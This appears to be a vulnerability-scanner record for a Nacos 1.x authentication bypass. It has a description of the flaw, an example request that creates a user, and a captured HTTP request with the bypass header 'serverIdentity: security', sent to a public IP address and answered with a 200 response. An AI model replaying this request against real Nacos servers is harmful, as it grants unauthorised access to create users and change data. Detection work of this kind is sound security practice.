info.name: Nacos 1.x - Authentication Bypass
info.author: taielab,pikpikcu,SleepingBag945
info.description: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 49.232.243.139
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security
req_resp.resp:
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:30:00 GMT
